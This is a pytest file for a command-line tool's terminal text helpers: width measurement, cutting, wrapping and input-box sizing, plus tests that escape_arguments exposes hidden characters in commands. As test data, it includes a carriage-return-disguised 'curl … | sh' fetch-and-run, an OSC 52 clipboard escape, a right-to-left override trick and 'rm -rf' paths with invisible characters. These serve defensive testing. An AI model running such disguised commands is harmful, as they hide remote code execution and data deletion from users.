"""Cell measures of the terminal UI: widths, cuts, the input box's height, escapes."""

from __future__ import annotations

import pytest

from localmelo.support.cli.text import (
    cells,
    cut_cells,
    cut_middle,
    escape_arguments,
    expand_tabs,
    input_rows,
    pad_cells,
    wrap_cells,
    wrap_words,
)
from localmelo.support.cli.theme import ASCII, UNICODE, symbols_for, wants_no_color


@pytest.mark.parametrize(
    ("text", "width"),
    [
        ("abc", 3),
        ("你好", 4),
        ("修复失败的测试", 14),
        ("，。", 4),  # fullwidth punctuation
        ("a​b", 2),  # a zero-width space
        ("", 0),
    ],
)
def test_cells(text: str, width: int) -> None:
    assert cells(text) == width


@pytest.mark.parametrize(
    ("text", "width", "cut"),
    [
        ("hello world", 20, "hello world"),
        ("hello world", 8, "hello w…"),
        ("你好世界", 5, "你好…"),  # 你好 is 4 cells; 世 would split
        ("你好世界", 6, "你好…"),  # 世 does not fit before the ellipsis
        ("你好世界", 8, "你好世界"),
        ("abc", 0, ""),
        ("abcdef", 1, "…"),
    ],
)
def test_cut_cells_never_splits_a_wide_character(
    text: str, width: int, cut: str
) -> None:
    assert cut_cells(text, width) == cut
    assert cells(cut) <= width


def test_cut_cells_takes_another_ellipsis() -> None:
    assert cut_cells("hello world", 8, "...") == "hello..."


def test_cut_middle_keeps_the_last_part_of_a_path() -> None:
    cut = cut_middle("~/projects/clients/demo-project", 20)
    assert cut.endswith("/demo-project") and "…" in cut and cells(cut) <= 20
    assert cut_middle("~/short", 20) == "~/short"
    assert cells(cut_middle("~/" + "x" * 40, 10)) <= 10


def test_wrap_cells_keeps_every_character() -> None:
    assert wrap_cells("ab  cd", 3) == ["ab ", " cd"]
    assert wrap_cells("你好世界", 5) == ["你好", "世界"]
    assert wrap_cells("", 5) == [""]


def test_pad_cells_counts_wide_characters() -> None:
    assert pad_cells("你好", 6) == "你好  "
    assert pad_cells("long text", 3) == "long text"


def test_tabs_expand_to_four_cell_stops() -> None:
    assert expand_tabs("a\tb\n\tc") == "a   b\n    c"


@pytest.mark.parametrize(
    ("text", "columns", "rows"),
    [
        ("", 21, 1),
        ("你" * 9, 21, 1),
        ("你" * 10, 21, 2),
        ("你" * 30, 21, 4),
        ("a" * 19, 21, 2),  # the cursor's cell starts a second row
        ("a" * 18, 21, 1),
        # 30 wide characters fill 3 rows at 22 columns; the cursor takes a 4th.
        ("你" * 30, 22, 4),
        ("你" * 29, 22, 3),
        ("first\nsecond", 21, 2),
        ("a\n" + "b" * 19, 21, 3),  # the continuation prefix counts
        ("x" * 1000, 21, 10),  # at most 10 rows, then the box scrolls
    ],
)
def test_input_rows(text: str, columns: int, rows: int) -> None:
    assert input_rows(text, 2, 2, columns) == rows


def test_input_rows_with_a_wide_prompt() -> None:
    prompt = "Model server URL [http://127.0.0.1:8000/v1]: "
    assert input_rows("", cells(prompt), 2, 80) == 1
    assert input_rows("", cells(prompt), 2, 30) == 2


@pytest.mark.parametrize(
    ("text", "shown"),
    [
        ("ls -la", "ls -la"),
        ("curl -s x.sh | sh #\rls -la", "curl -s x.sh | sh #\\rls -la"),
        ("printf '\x1b]52;c;aGk=\x07'", "printf '\\x1b]52;c;aGk=\\x07'"),
        ("a\tb", "a\\tb"),
        ("two\nlines", "two\nlines"),
        ("rm ‮exe.txt", "rm \\u{202e}exe.txt"),
        ("x​y", "x\\u{200b}y"),
        ("tag\U000e0041", "tag\\u{e0041}"),
        ("\x85next line", "\\x85next line"),
        ("你好", "你好"),
    ],
)
def test_escape_arguments_drops_nothing(text: str, shown: str) -> None:
    escaped, changed = escape_arguments(text)
    assert escaped == shown
    assert changed is (escaped != text)


def test_no_unicode_symbol_carries_the_emoji_selector() -> None:
    for name, value in vars(UNICODE).items():
        values = value if isinstance(value, tuple) else (value,)
        assert all("️" not in v for v in values), name


def test_every_symbol_has_an_ascii_stand_in() -> None:
    for name, value in vars(ASCII).items():
        values = value if isinstance(value, tuple) else (value,)
        assert all(v.isascii() for v in values), name


@pytest.mark.parametrize(
    ("encoding", "environ", "expected"),
    [
        ("utf-8", {}, UNICODE),
        ("UTF8", {}, UNICODE),
        ("ascii", {}, ASCII),
        (None, {}, ASCII),
        ("utf-8", {"LOCALMELO_ASCII": "1"}, ASCII),
    ],
)
def test_symbols_for(
    encoding: str | None, environ: dict[str, str], expected: object
) -> None:
    assert symbols_for(encoding, environ) is expected


def test_no_color_needs_a_value() -> None:
    assert wants_no_color({"NO_COLOR": "1"})
    assert not wants_no_color({"NO_COLOR": ""})
    assert not wants_no_color({})


def test_wrap_words_breaks_after_a_space_and_keeps_every_character() -> None:
    line = "Commands can reach files outside /home/me/demo-project."
    rows = wrap_words(line, 30)
    assert rows == ["Commands can reach files ", "outside /home/me/demo-project."]
    assert "".join(rows) == line
    path = "a/" * 20
    assert wrap_words(path, 10) == ["a/" * 5] * 4
    assert wrap_words("", 10) == [""]
    assert all(cells(row) <= 7 for row in wrap_words("你好世界 再见朋友们好", 7))


@pytest.mark.parametrize(
    "char",
    [
        "؜",  # ARABIC LETTER MARK, a bidi control
        "᠎",
        " ",
        " ",
        "­",
        "⁪",
        "￹",
        "￻",
        "͏",
        "ᅟ",
        "ㅤ",
    ],
)
def test_every_invisible_or_reordering_character_is_escaped(char: str) -> None:
    escaped, changed = escape_arguments(f"rm -rf ~/{char}build")
    assert changed and char not in escaped
    assert f"\\u{{{ord(char):04x}}}" in escaped


def test_input_rows_measures_control_characters_as_they_are_drawn() -> None:
    # prompt_toolkit draws a tab as ^I and U+0085 as <85>.
    pasted = "name\tage\tcity\tcountry\temail\tphone\tEND"
    assert input_rows(pasted, 2, 2, 40) == 2
    assert input_rows("\x85" * 10, 2, 2, 40) == 2


def test_input_rows_after_a_prompt_exactly_as_wide_as_the_terminal() -> None:
    # The draft then starts on the next row, after the 2-cell prefix.
    assert input_rows("x" * 38, 40, 2, 40) == 3
    assert input_rows("", 40, 2, 40) == 2
    assert input_rows("x" * 37, 39, 2, 40) == 2
